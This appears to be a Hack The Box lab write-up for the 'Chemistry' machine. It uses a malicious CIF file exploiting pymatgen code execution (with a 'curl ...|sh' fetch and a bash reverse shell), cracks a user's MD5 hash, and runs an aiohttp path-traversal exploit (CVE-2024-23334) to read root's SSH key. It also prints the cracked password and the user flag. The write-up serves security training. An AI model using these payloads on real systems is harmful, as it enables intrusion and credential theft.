---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - CrystallographicInformationFile
  - CIF
  - JonesFaithfulTransformation
  - Pymatgen
  - ArbitraryCodeExecution
  - sqlite3
  - Database
  - LocalFileInclusion
  - LFI
  - aiohttp
---

![](images/Chemistry.png)

## Summary

The box starts with a `viewer` for `Crystallographic Information Files (CIF)` running on port `5000/TCP`. After creating an account and logging in it is possible to achieve `Arbitrary Code Execution` through a maliciously crafted `.cif file` to gain `foothold` on the box. From the user context of the user called `app` a `MD5 hash` can be carved out of a `sqlite3 database` to `escalate privileges` to the user `rosa` which stores the `user.txt` in her `home directory`. In the process of `pivoting` a `Site Monitoring web application` shows up running on port `8080/TCP` of `localhost`. It can be accessed by forwarding the port using `SSH` for example. The `CVE-2024-23334` describes a `Local File Inclusion (LFI) vulnerability` in `aiohttp` which is used by the `web application`. Abusing this vulnerability enables the option to read the `SSH key` of `root` and provides the way to the `root.txt` and to close the box after grabbing it.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 5000/TCP](#Enumeration-of-Port-5000TCP)
- [Foothold](#Foothold)
    - [JonesFaithfulTransformation Arbitrary Code Execution](#JonesFaithfulTransformation-Arbitrary-Code-Execution)
- [Enumeration](#Enumeration)
- [Privilege Escalation to rosa](#Privilege-Escalation-to-rosa)
- [user.txt](#usertxt)
- [Pivoting](#Pivoting)
- [Site Monitoring](#Site-Monitoring)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [CVE-2024-23334: Local File Inclusion (LFI) in aiohttp](#CVE-2024-23334-Local-File-Inclusion-LFI-in-aiohttp)
- [root.txt](#roottxt)

## Reconnaissance

### Port Scanning

We started the box as always with a basic `port scan` using `Nmap`. The results showed that only port `22/TCP` and port `5000/TCP` were open.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.160.79
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 11:06 CEST
Nmap scan report for 10.129.160.79
Host is up (0.021s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sun, 20 Oct 2024 09:06:26 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/20%Time=6714C80F%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Sun,\x2020\x20Oct\x202024\x2009:06:26\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.93 seconds
```

### Enumeration of Port 5000/TCP

On port `5000/TCP` we found a `viewer` for `Crystallographic Information Files (CIF)` which allowed `registration` and `login` to the `web application`.

- [http://10.129.160.79:5000/](http://10.129.160.79:5000/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.160.79:5000/
http://10.129.160.79:5000/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.129.160.79], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]
```

![](images/2024-10-20_11-18_80_website.png)

![](images/2024-10-20_11-19_80_register.png)

After creating an account we found ourselves on a `dashboard` which offered the option to upload `.cif` files.

![](images/2024-10-20_11-19_80_dashboard.png)

We downloaded the `example file` for a quick check to see if we could find any useful information.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Chemistry/files]
└─$ cat example.cif 
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

To have the full picture we `re-uploaded` the example to see how the `web application` would handle it.

![](images/2024-10-20_11-26_80_example_upload.png)

## Foothold

### JonesFaithfulTransformation Arbitrary Code Execution

Our man `ethicxz` did a quick search on `Google` about `cif file exploits` and came up with the following `Proof of Concept (PoC)` exploit.

- [https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

We modified it to our needs and saved it as `vuln.cif`, ready to be uploaded to the `web application`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Chemistry/serve]
└─$ cat vuln.cif 
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl 10.10.14.44/x|sh");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

We also prepared the `payload` which we expected to get accessed and executed by the `web application`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Chemistry/serve]
└─$ cat x 
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.44/9001 0>&1'
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Chemistry/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We uploaded the malicious `vuln.cif` file to the `web application`.

![](images/2024-10-20_11-33_80_vuln_cif.png)

![](images/2024-10-20_11-34_80_vuln_cif_upload_successful.png)

Then we `triggered` the `payload` by clicking on `View` and got a `callback`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Chemistry/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.160.79 - - [20/Oct/2024 11:34:47] "GET /x HTTP/1.1" 200 -
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.160.79] 56492
bash: cannot set terminal process group (1044): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ 
```

```c
app@chemistry:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
app@chemistry:~$ ^Z
zsh: suspended  nc -lnvp 9001

┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

app@chemistry:~$ 
app@chemistry:~$ export XTERM=xterm
app@chemistry:~$
```

## Enumeration

Since we got a `reverse shell` as the user `app` we first checked our `group memberships`.

```c
app@chemistry:~$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

Then we had a look at `/etc/passwd` to see what other users are available on the box.

```c
app@chemistry:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

And we found another one called `rosa`.

| Username |
| -------- |
| rosa     |

As next step we checked our `home directory` and spotted a `folder` called `instance`.

```c
app@chemistry:~$ ls -la
total 52
drwxr-xr-x 8 app  app  4096 Oct  9 20:18 .
drwxr-xr-x 4 root root 4096 Jun 16 23:10 ..
-rw------- 1 app  app  5852 Oct  9 20:08 app.py
lrwxrwxrwx 1 root root    9 Jun 17 01:51 .bash_history -> /dev/null
-rw-r--r-- 1 app  app   220 Jun 15 20:43 .bash_logout
-rw-r--r-- 1 app  app  3771 Jun 15 20:43 .bashrc
drwxrwxr-x 3 app  app  4096 Jun 17 00:44 .cache
drwx------ 2 app  app  4096 Oct 20 09:34 instance
drwx------ 7 app  app  4096 Jun 15 22:57 .local
-rw-r--r-- 1 app  app   807 Jun 15 20:43 .profile
lrwxrwxrwx 1 root root    9 Jun 17 01:52 .sqlite_history -> /dev/null
drwx------ 2 app  app  4096 Oct  9 20:13 static
drwx------ 2 app  app  4096 Oct  9 20:18 templates
drwx------ 2 app  app  4096 Oct 20 09:34 uploads
```

The folder contained a `sqlite3` database on which we used `strings` to get the content displayed on our shell.

```c
app@chemistry:~/instance$ ls -la
total 28
drwx------ 2 app app  4096 Oct 20 09:34 .
drwxr-xr-x 8 app app  4096 Oct  9 20:18 ..
-rwx------ 1 app app 20480 Oct 20 09:34 database.db
```

```c
app@chemistry:~/instance$ strings database.db 
SQLite format 3
ytableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
indexsqlite_autoindex_user_1user
5tablestructurestructure
CREATE TABLE structure (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        filename VARCHAR(150) NOT NULL,
        identifier VARCHAR(100) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (identifier)
indexsqlite_autoindex_structure_1structure
vuln.ciff4ec2993-d79a-4d5f-8173-10f51e9c2490
U       f4ec2993-d79a-4d5f-8173-10f51e9c2490
Mfoobar3858f62230ac3c915f300c664312c63f+
Mkristel6896ba7b11a62cacffbdaded457c6d92(
Maxel9347f9724ca083b17e39555c36fd9007*
Mfabian4e5d71f53fdd2eabdbabb233113b5dc0+
Mgelacia4af70c80b68267012ecdac9a7e916d18+
Meusebio6cad48078d0241cca9a7b322ecd073b3)
Mtaniaa4aa55e816205dc0389591c9f82f43bb,
Mvictoriac3601ad2286a4293868ec2a4bc606ba3)
Mpeter6845c17d298d95aa942127bdad2ceb9b*
Mcarlos9ad48828b0955513f7cf0f7f6510c8f8*
Mjobert3dec299e06f7ed187bac06bd3b670ab2*
Mrobert02fcf7cfc10adc37959fb21f06c6b467(
Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'
Mapp197865e46b878d9e74a0346b6d59886a)
Madmin2861debaf8d99436a10ed6f75a252abf
foobar
kristel
axel
fabian
gelacia
eusebio
tania
victoria
peter
carlos
jobert
robert
rosa
        admin
```

Since we only knew the user `rosa` we just grabbed her `hash` to work with and ignored the others until we got stuck eventually.

| Hash                             |
| -------------------------------- |
| 63ed86ee9f624c7b14f1d4f43dc251a5 |

## Privilege Escalation to rosa

Luckily for us this was a super `low-hanging fruit` since her hash was already `cracked` and `known` at `https://crackstation.net/` and so we got her `password`.

- [https://crackstation.net/](https://crackstation.net/)

| Password          |
| ----------------- |
| unicorniosrosados |

```c
┌──(kali㉿kali)-[~]
└─$ ssh rosa@10.129.160.79
The authenticity of host '10.129.160.79 (10.129.160.79)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.160.79' (ED25519) to the list of known hosts.
rosa@10.129.160.79's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 20 Oct 2024 09:43:40 AM UTC

  System load:           0.03
  Usage of /:            72.7% of 5.08GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.129.160.79
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c8e1

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

rosa@chemistry:~$
```

## user.txt

The user `rosa` granted us access to the `user.txt` which we grabbed to proceed with `pivoting` through her user.

```c
rosa@chemistry:~$ cat user.txt 
d21f8b0f88f0c59679a42f39ff64b53e
```

## Pivoting

Once again we performed the `basic checks` for `enumeration` to get as much knowledge about our options for `escalating our privileges` to `root` as possible.

```c
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
```

```c
rosa@chemistry:~$ ls -la
total 36
drwxr-xr-x 5 rosa rosa 4096 Jun 17 01:51 .
drwxr-xr-x 4 root root 4096 Jun 16 23:10 ..
lrwxrwxrwx 1 root root    9 Jun 17 01:50 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rosa rosa 3771 Feb 25  2020 .bashrc
drwx------ 2 rosa rosa 4096 Jun 15 20:38 .cache
drwxrwxr-x 4 rosa rosa 4096 Jun 16 16:04 .local
-rw-r--r-- 1 rosa rosa  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Jun 17 01:51 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa 4096 Jun 15 18:24 .ssh
-rw-r--r-- 1 rosa rosa    0 Jun 15 20:43 .sudo_as_admin_successful
-rw-r----- 1 root rosa   33 Oct 20 09:03 user.txt
```

```c
rosa@chemistry:~$ sudo -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on chemistry.
```

While we checked for only `locally` available `ports` we found port `8080/TCP` running on `localhost`.

```c
rosa@chemistry:~$ ss -tulpn
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                            127.0.0.1:8080                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:5000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                                                
```

A quick `curl` showed some sort of `Site Monitoring` running on that port.

```c
rosa@chemistry:~$ curl 127.0.0.1:8080
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }


    </style>
</head>
<--- CUT FOR BREVITY --->
```

## Site Monitoring

To investigate the `Site Monitoring` application even further we `forwarded` port `8080/TCP` to port `8081/TCP` on our local machine. We chose a different port than `8080/TCP` because `Burp Suite` was already running on port `8080/TCP`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh -L 8081:127.0.0.1:8080 rosa@10.129.160.79
<--- CUT FOR BREVITY --->
```

Then we started enumerating the application and noticed `aiohttp` was running on version `3.9.1` which was interesting.

- [http://127.0.0.1:8081/](http://127.0.0.1:8081/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://127.0.0.1:8081/
http://127.0.0.1:8081/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[127.0.0.1], JQuery[3.6.0], Script, Title[Site Monitoring]
```

The `web application` itself offered very little options to work with. Therefore we decided to take a closer look on `aiohttp`.

![](images/2024-10-20_11-48_8080_site_monitoring_dashboard.png)

## Privilege Escalation to root

### CVE-2024-23334: Local File Inclusion (LFI) in aiohttp

After a little bit of research we found a already available `Proof of Concept (PoC)` exploit for `CVE-2024-23334` which described a `Local File Inclusion (LFI)` vulnerability in `aiohttp`.

- [https://github.com/z3rObyte/CVE-2024-23334-PoC](https://github.com/z3rObyte/CVE-2024-23334-PoC)

```c
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

The `Proof of Concept (PoC)` tried to access `/static/` and so we firstly verified that the directory actually exists on the box. To do this we performed a quick `Directory Brute Forcing` using `dirsearch`.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://127.0.0.1:8081/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_127.0.0.1_8081/__24-10-20_11-54-19.txt

Target: http://127.0.0.1:8081/

[11:54:19] Starting: 
[11:54:34] 403 -   14B  - /assets/                                          
[11:54:34] 403 -   14B  - /assets                                           
                                                                             
Task Completed
```

Since we only found a `/assets/` we tried to execute it there and got lucky!

```c
GET /assets/../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: remember_token=defaultuser@changedetection.io|944643701d7eaf4435d6dabf09180720963153a8510359fc4aeee7eeaec680dc962b5017f211f9a49bcba9441023e354878583f2030cb7c112c3e68ed9008e85
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Etag: "17fd638c3d6090a6-7c0"
Last-Modified: Fri, 11 Oct 2024 11:48:06 GMT
Content-Length: 1984
Accept-Ranges: bytes
Date: Sun, 20 Oct 2024 09:54:44 GMT
Server: Python/3.9 aiohttp/3.9.1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false

```

![](images/2024-10-20_11-56_8080_site_monitoring_lfi.png)

Now since we confirmed that the `Local File Inclusion (LFI)` on `/assets/` worked our next logical step was trying to read the `SSH key` of `root` and that worked too!

```c
GET /assets/../../../../../root/.ssh/id_rsa HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: remember_token=defaultuser@changedetection.io|944643701d7eaf4435d6dabf09180720963153a8510359fc4aeee7eeaec680dc962b5017f211f9a49bcba9441023e354878583f2030cb7c112c3e68ed9008e85
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Content-Type: application/octet-stream
